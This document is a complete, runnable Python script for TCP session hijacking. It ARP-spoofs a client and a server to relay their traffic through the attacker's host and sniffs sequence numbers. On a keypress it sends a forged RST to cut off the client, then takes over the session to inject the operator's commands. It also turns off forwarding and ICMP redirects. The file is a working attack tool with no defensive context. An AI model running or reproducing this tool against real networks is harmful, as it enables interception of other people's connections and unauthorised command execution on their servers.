#!/usr/bin/env python3

'''
Script for TCP hijacking
'''

import os
import time
import sys
import tty
import termios
import select
from typing import Optional
from framebuilder import eth, ipv4, tcp, tools, errors

class Host:

    def __init__(self, ip_addr:str, mac_addr:str):
        self.ip_addr = ip_addr
        self.mac_addr = mac_addr

    def __str__(self):
        return f'{self.ip_addr} ({self.mac_addr})'


class ArpHandler:

    def __init__(self, interface:str='eth0', operation:int=1, **kwargs):
        self.interface = interface
        self.operation = operation
        self.src_addr = kwargs.get('src_addr', tools.get_mac_addr(interface))
        self.dst_addr = kwargs.get('dst_addr', 'ff:ff:ff:ff:ff:ff')
        self.snd_hw_addr = kwargs.get('snd_hw_addr', self.src_addr)
        self.snd_ip_addr = kwargs.get('snd_ip_addr', tools.get_if_ipv4_addr(interface))
        self.tgt_hw_addr = kwargs.get('tgt_hw_addr', '00:00:00:00:00:00')
        self.tgt_ip_addr = kwargs.get('tgt_ip_addr', '0.0.0.0')

    def __compile_arp_message(self) -> eth.ArpMessage:
        return eth.ArpMessage({
            'operation': self.operation,
            'src_addr': self.src_addr,
            'dst_addr': self.dst_addr,
            'snd_hw_addr': self.snd_hw_addr,
            'snd_ip_addr': self.snd_ip_addr,
            'tgt_hw_addr': self.tgt_hw_addr,
            'tgt_ip_addr': self.tgt_ip_addr})

    def __str__(self) -> str:
        info_string = f'interface: {self.interface}'
        info_string += f'\noperation: {self.operation}'
        info_string += f'\nsrc_addr: {self.src_addr}'
        info_string += f'\ndst_addr: {self.dst_addr}'
        info_string += f'\nsnd_hw_addr: {self.snd_hw_addr}'
        info_string += f'\nsnd_ip_addr: {self.snd_ip_addr}'
        info_string += f'\ntgt_hw_addr: {self.tgt_hw_addr}'
        info_string += f'\ntgt_ip_addr: {self.tgt_ip_addr}'
        return info_string

    def send(self):
        arp_msg = self.__compile_arp_message()
        socket = tools.create_socket(self.interface, blocking=0)
        arp_msg.send(socket)
        socket.close()


class TermHandler:

    def __init__(self):
        self.attr = termios.tcgetattr(sys.stdin)
        self.orig_attr = self.attr
        self.last_key = chr(0)

    def __del__(self):
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.orig_attr)

    def set_cbreak(self):
        tty.setcbreak(sys.stdin.fileno())
        self.attr = termios.tcgetattr(sys.stdin)

    def echo_on(self):
        self.attr[3] |= termios.ECHO
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.attr)

    def get_key(self) -> Optional[chr]:
        stdin = sys.stdin
        key_pressed = select.select([stdin], [], [], 0) == ([stdin], [], [])
        if key_pressed:
            self.last_key = sys.stdin.read(1)
            return self.last_key
        return None


class Hijacker:

    RED = (200, 0, 0)
    GREEN = (0, 200, 0)
    BLUE = (0, 0, 250)
    GREY = (100, 100, 100)
    ORANGE = (200, 150, 100)

    def __init__(self, interface:str, client_ip:str, server_ip:str, port:int):
        self.interface = interface
        local_mac_addr = tools.get_mac_addr(interface)
        local_ip_addr = tools.get_if_ipv4_addr(interface)
        self.local_host = Host(local_ip_addr, local_mac_addr)
        self.client = Host(client_ip, self.get_mac_addr(client_ip, interface))
        self.client_gateway = self.find_gateway_to(self.client)
        self.server = Host(server_ip, self.get_mac_addr(server_ip, interface))
        self.server_gateway = self.find_gateway_to(self.server)
        self.client_spoofer, self.server_spoofer = self.__setup_spoofers(local_mac_addr)
        self.server_port = port
        self.term_handler = TermHandler()
        self.client_port = 0
        self.seq_nr = 0
        self.ack_nr = 0
        self.hijacking_possible = False
        self.hijacked = False
        self.current_time = 0
        self.arp_interval_ns = 10 ** 9
        self.eth_handler = eth.EthernetHandler(interface, local_mac=local_mac_addr, block=0)
        self.tcp_handler = None

    def __intro(self):
        tools.print_rgb('******************', self.ORANGE, bold=True)
        tools.print_rgb('*  TCP Hijacker  *', self.ORANGE, bold=True)
        tools.print_rgb('******************', self.ORANGE, bold=True)
        host_str = f'interface: {self.interface} '
        host_str += f'({self.local_host.ip_addr} / {self.local_host.mac_addr})'
        tools.print_rgb(host_str, self.GREY, bold=True)
        tools.print_rgb(f'service port: {self.server_port}', self.GREY, bold=True)
        client_str = f'client: {self.client.ip_addr} ({self.client.mac_addr})'
        if self.client_gateway is not None:
            client_str += f'\ngw: {self.client_gateway.ip_addr} ('
            client_str += f'{self.client_gateway.mac_addr})'
        else:
            client_str += '\ngw: None (on link)'
        tools.print_rgb(client_str, self.GREY, bold=True)
        server_str = f'server: {self.server.ip_addr} ({self.server.mac_addr})'
        if self.server_gateway is not None:
            server_str += f'\ngw: {self.server_gateway.ip_addr} ('
            server_str += f'{self.server_gateway.mac_addr})'
        else:
            server_str += '\ngw: None (on link)'
        tools.print_rgb(server_str, self.GREY, bold=True)
        tools.print_rgb('- press h to hijack the connection -', self.GREEN, bold=True)

    def __setup_spoofers(self, local_mac_addr) -> (ArpHandler, ArpHandler):
        client_arp_ip = self.client.ip_addr
        client_arp_mac = self.client.mac_addr
        server_arp_ip = self.server.ip_addr
        server_arp_mac = self.server.mac_addr
        if self.client_gateway is not None:
            client_arp_ip = self.client_gateway.ip_addr
            client_arp_mac = self.client_gateway.mac_addr
        if self.server_gateway is not None:
            server_arp_ip = self.server_gateway.ip_addr
            server_arp_mac = self.server_gateway.mac_addr
        client_spoofer = ArpHandler(self.interface, operation=2,
                dst_addr=client_arp_mac,
                snd_ip_addr=server_arp_ip,
                tgt_hw_addr=local_mac_addr,
                tgt_ip_addr=server_arp_ip)
        server_spoofer = ArpHandler(self.interface, operation=2,
                dst_addr=server_arp_mac,
                snd_ip_addr=client_arp_ip,
                tgt_hw_addr=local_mac_addr,
                tgt_ip_addr=client_arp_ip)
        return client_spoofer, server_spoofer

    def find_gateway_to(self, target_host:Host) -> Optional[Host]:
        gateway_ip = tools.get_route_gateway(target_host.ip_addr)
        if gateway_ip is not None:
            return Host(gateway_ip, self.get_mac_addr(gateway_ip, self.interface))
        return None

    @staticmethod
    def get_mac_addr(ip_addr:str, if_name:str) -> str:
        arp_querier = ArpHandler(if_name, snd_ip_addr='0.0.0.0', tgt_ip_addr=ip_addr)
        for _ in range(5):
            try:
                mac_addr = tools.get_mac_for_dst_ip(ip_addr)
                return mac_addr
            except errors.FailedMACQueryException:
                # set an invalid ARP cache entry and try to update it
                tools.set_neigh(if_name, ip_addr)
                arp_querier.send()
                time.sleep(0.2)
        return '00:00:00:00:00:00'

    def cut_off_client(self):
        ip_handler = ipv4.IPv4Handler(self.interface,
                self.client.ip_addr, self.server.ip_addr)
        rst_seg = tcp.TCPSegment()
        rst_seg.src_port = self.server_port
        rst_seg.dst_port = self.client_port
        rst_seg.seq_nr = self.ack_nr
        rst_seg.ack_nr = self.seq_nr
        rst_seg.window = 1460
        rst_seg.rst = 1
        rst_seg.ack = 1
        ip_handler.send(rst_seg)

    def __spoof(self):
        if time.time_ns() >= self.current_time + self.arp_interval_ns:
            self.client_spoofer.send()
            self.server_spoofer.send()
            self.current_time = time.time_ns()

    def __next_frame(self) -> eth.Frame:
        frame, frame_type = self.eth_handler.receive(promisc=True)
        # skip frames that we have sent (frame_type 4)
        if frame_type == 4:
            frame = None
        return frame

    def __must_forward(self, ip_pk:ipv4.IPv4Packet) -> bool:
        ip_relevant = [self.client.ip_addr in (ip_pk.src_addr, ip_pk.dst_addr),
                self.server.ip_addr in (ip_pk.src_addr, ip_pk.dst_addr)]
        for_me = ip_pk.dst_addr == self.local_host.ip_addr
        return any(ip_relevant) and not for_me

    def __from_client(self, ip_pk:ipv4.IPv4Packet, tcp_seg:tcp.TCPSegment) -> bool:
        return all([self.client.ip_addr == ip_pk.src_addr,
            self.client_port == tcp_seg.src_port,
            self.server_port == tcp_seg.dst_port])

    def __from_server(self, ip_pk:ipv4.IPv4Packet, tcp_seg:tcp.TCPSegment) -> bool:
        return all([self.server.ip_addr == ip_pk.src_addr,
            self.client_port == tcp_seg.dst_port,
            self.server_port == tcp_seg.src_port])

    def __print_segment(self, tcp_seg:tcp.TCPSegment):
        color = self.GREY
        if self.server_port in (tcp_seg.src_port, tcp_seg.dst_port):
            color = self.GREEN
        seg_str = f'{tcp_seg.src_port}->{tcp_seg.dst_port} '
        seg_str += f'seq {tcp_seg.seq_nr} ack {tcp_seg.ack_nr} '
        seg_str += f'len {tcp_seg.length} flags {tcp_seg.get_flag_str()}'
        if tcp_seg.length > 0:
            seg_str += f' -- data: {tcp_seg.payload}'
        tools.print_rgb(seg_str, color, bold=False)

    def __process_segment(self, ip_pk:ipv4.IPv4Packet, tcp_seg:tcp.TCPSegment):
        client_port_conditions = [self.client_port == 0,
                ip_pk.src_addr == self.client.ip_addr,
                ip_pk.dst_addr == self.server.ip_addr,
                tcp_seg.dst_port == self.server_port]
        if all(client_port_conditions):
            self.client_port = tcp_seg.src_port
        if self.hijacked and self.__from_client(ip_pk, tcp_seg):
            return False
        if self.hijacked and self.__from_server(ip_pk, tcp_seg):
            return False
        if self.__from_client(ip_pk, tcp_seg):
            self.seq_nr = tcp_seg.seq_nr
            self.ack_nr = tcp_seg.ack_nr
            if not self.hijacking_possible:
                self.hijacking_possible = True
        if not self.hijacked:
            self.__print_segment(tcp_seg)
        return True

    def __process_frame(self, frame):
        if frame is None:
            return
        ip_pk = ipv4.IPv4Packet.from_frame(frame)
        tcp_seg = tcp.TCPSegment.from_packet(ip_pk) if ip_pk.protocol == 6 else None
        if not self.__must_forward(ip_pk):
            return
        if tcp_seg is not None and not self.__process_segment(ip_pk, tcp_seg):
            return
        server_mac = self.server.mac_addr
        if self.server_gateway is not None:
            server_mac = self.server_gateway.mac_addr
        client_mac = self.client.mac_addr
        if self.client_gateway is not None:
            client_mac = self.client_gateway.mac_addr
        if frame.src_addr == server_mac:
            self.eth_handler.remote_mac = client_mac
            self.eth_handler.send(ip_pk)
        if frame.src_addr == client_mac:
            self.eth_handler.remote_mac = server_mac
            self.eth_handler.send(ip_pk)

    def __process_input(self, key:chr):
        if not self.hijacked:
            if key in ('h', 'H'):
                if not self.hijacking_possible:
                    tools.print_rgb('Not enough data!', rgb=self.RED, bold=True)
                    return
                self.cut_off_client()
                self.tcp_handler = tcp.TCPHandler(self.interface,
                        self.client_port, self.server.ip_addr, block=0)
                self.tcp_handler.remote_port = self.server_port
                self.tcp_handler.local_ip = self.client.ip_addr
                self.tcp_handler._rcv_nxt = self.ack_nr
                self.tcp_handler._snd_nxt = self.seq_nr
                self.tcp_handler._snd_una = self.seq_nr
                self.tcp_handler._snd_wnd = 65535
                self.tcp_handler._rem_rwnd = 65535
                self.tcp_handler.state = tcp.TCPHandler.ESTABLISHED
                self.hijacked = True
                hijacked_str=f'connection hijacked (client port: {self.client_port})!'
                tools.print_rgb(hijacked_str, rgb=self.ORANGE, bold=True)
                tools.print_rgb('type some command: ', rgb=self.GREY, bold=False)
                self.term_handler.echo_on()
        elif key != chr(4) and key is not None:
            self.tcp_handler.send(key.encode())

    def __receive_data(self):
        if not self.hijacked:
            return
        data = self.tcp_handler.receive(65535).decode()
        if data != '':
            print(data, end='')

    def __tear_down(self):
        if self.hijacked:
            self.tcp_handler.close()
        client_arp_ip = self.client.ip_addr
        client_arp_mac = self.client.mac_addr
        server_arp_ip = self.server.ip_addr
        server_arp_mac = self.server.mac_addr
        if self.client_gateway is not None:
            client_arp_ip = self.client_gateway.ip_addr
            client_arp_mac = self.client_gateway.mac_addr
        if self.server_gateway is not None:
            server_arp_ip = self.server_gateway.ip_addr
            server_arp_mac = self.server_gateway.mac_addr
        self.client_spoofer.operation = 2
        self.client_spoofer.src_addr = self.local_host.mac_addr
        self.client_spoofer.dst_addr = client_arp_mac
        self.client_spoofer.snd_hw_addr = server_arp_mac
        self.client_spoofer.snd_ip_addr = server_arp_ip
        self.client_spoofer.tgt_hw_addr = server_arp_mac
        self.client_spoofer.tgt_ip_addr = server_arp_ip
        self.server_spoofer.operation = 2
        self.server_spoofer.src_addr = self.local_host.mac_addr
        self.server_spoofer.dst_addr = server_arp_mac
        self.server_spoofer.snd_hw_addr = client_arp_mac
        self.server_spoofer.snd_ip_addr = client_arp_ip
        self.server_spoofer.tgt_hw_addr = client_arp_mac
        self.server_spoofer.tgt_ip_addr = client_arp_ip
        for _ in range(3):
            self.server_spoofer.send()
            self.client_spoofer.send()
            time.sleep(0.1)

    def run(self):
        self.term_handler.set_cbreak()
        self.__intro()
        try:
            while self.term_handler.last_key != chr(4):
                self.__spoof()
                self.__process_frame(self.__next_frame())
                self.__process_input(self.term_handler.get_key())
                self.__receive_data()
            tools.print_rgb('\nCtrl-D...', self.ORANGE, bold=True, end='')
        except KeyboardInterrupt:
            tools.print_rgb('\nCtrl-C...', self.ORANGE, bold=True, end='')
        finally:
            self.__tear_down()
            tools.print_rgb('Terminated\n', self.ORANGE, bold=True)


if __name__ == '__main__':

    def print_err(msg):
        arg_str = 'interface client_ip server_ip server_port'
        print('Error:', msg)
        print(f'Usage: {sys.argv[0]} {arg_str}')

    def check_args():
        if len(sys.argv) < 5:
            print_err('Missing arguments')
            sys.exit(1)
        if not tools.is_valid_ipv4_address(sys.argv[2]):
            print_err(f'Invalid IP address: {sys.argv[2]}')
            sys.exit(1)
        if not tools.is_valid_ipv4_address(sys.argv[3]):
            print_err(f'Invalid IP address: {sys.argv[3]}')
            sys.exit(1)
        try:
            _ = int(sys.argv[4])
        except ValueError:
            print_err(f'Invalid port number: {sys.argv[4]}')
            sys.exit(1)
        if not 0 <= int(sys.argv[4]) <= 65535:
            print_err(f'Invalid port number: {sys.argv[4]}')
            sys.exit(1)

    check_args()
    os.system(f'sysctl -w net.ipv4.conf.{sys.argv[1]}.forwarding=0')
    os.system(f'sysctl -w net.ipv4.conf.{sys.argv[1]}.send_redirects=0')
    hijacker = Hijacker(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
    hijacker.run()
